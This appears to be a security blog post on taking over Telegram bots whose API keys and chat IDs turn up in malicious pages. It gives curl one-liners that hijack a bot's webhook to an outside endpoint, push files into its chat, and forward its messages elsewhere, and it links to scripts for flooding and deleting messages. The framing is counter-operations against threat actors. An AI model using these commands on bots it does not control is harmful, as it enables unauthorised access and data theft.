## Overview

So, threat actors commonly use telegram bots. 

For usually one of two reasons:
1. Exfilitrate data
2. Receive commands

Now, there lies a big problem for the big bad hacker. To communicate with these bots you need two things
- Bot API Key
- Message ChatID

So, therefore, these details have to live somewhere in the code. Andddd most of the time it's right in front of your face. View page source and badda bing badda boom.

So, today I'm going to go over:
1. What the heck are Telegram API Keys and Chat IDs
2. Reconnasiance one-liners to gather information about the bot!
3. Counter-ops one-liners and commands to annoy the bot owner!
4. Data exfilitration script we can use to forward messages the bot has access to!
5. Putting it all together

### What is a Telegram Bot API Key and Chat ID

API KEY

Usually, with an API endpoint you need a key and a secret. For telegram you just need the key.

To create a bot open Telegram and message the "BotFather" ``/start`` and then ``/newbot`` and the rest is history.

CHAT ID

Each Chat in telegram has a chat ID. However, each user/bot also has a Chat ID. 

A ChatID is an identifer for a chat. So to query that chat, you need to query that chatid. This tells the bot what chat to interact with.

So if you want to read/view messages a bot has access to, you need a chatid so you can forward them to yourself.

### Reconnasiance One-Liners

So you can query all these endpoints super easy using ``curl`` in CLI. I'd do so from a Kali box with a VPN for piece of mind. 

Here a few helpful API endpoints you can hit to get information about the bot.

/getMe
- Accepts API Key as a parameter. Displays generic information about the bot. 

``curl -s -X GET "https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getMe"``

/getChat
- Accepts a ChatID and API Key as parameters. Provides you information about the chat.

``curl -s -X GET "https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getChat?chat_id=<CHAT_ID>"``

### Counter-Ops One-Liners

/setWebhook
- Accepts API Key as a parameter. Sets a webhook for the bot. Therefore, every command sent to it will be re-routed to your webhook.

``curl -s -X POST "https://api.telegram.org/bot<YOUR_BOT_TOKEN>/setWebhook" -d "url=https://webhook.site/<PARAMETERS>"``

You can generate a free webhook at ``https://webhook.site``

/sendDocument
- Accepts a ChatID and API Key as parameters. I'll let your mind think about the possibilities for this one (think counter-ops) 

``curl -s -X POST "https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendDocument" -F "chat_id=<CHAT_ID>" -F "document=@/path/to/file.pdf"``

/sendMessage
- Great for testing how many messages a bot can send in a short period. Also great for testing if the bot can send messages to itself and/or others!

[sendMessage - Test strength of Telegram bot](https://github.com/lvl0socanalyst/Telegram-Scripts/blob/main/sendMessage_strength_tester.sh)

[sendMessage - Send a lovely Message to someone as the bot](https://github.com/lvl0socanalyst/Telegram-Scripts/blob/main/sendMessage_send_lovely_message.sh)

/deleteMessage
- Accepts a ChatID and API Key as parameters. I've created a script for this, as curl doesn't work that well.

[deleteMessage - Delete all messages sent by the bot](https://github.com/lvl0socanalyst/Telegram-Scripts/blob/main/deleteMessage.sh)

### Data Exfilitration

/forwardMessage
- Accepts a ChatID and API Key as parameters. Easily the best API endpoint. Essentially forwards all messages a bot can see in a chat to another chat. If you want to determine what the bot is being sent exactly this is the script for you.

[forwardMessage - Forward all messages from a chat the bot has access to](https://github.com/lvl0socanalyst/Telegram-Scripts/blob/main/forwardMessage.sh)

### Putting it all together

Okay, in this simulation I'll run through the process of what we can do after we find a Telegram Bot API Key and Chat ID.



### Disclaimer

The following scripts should only be used on bots that you own and further that have not been used for any malicious activity as against Telegram's TOS.
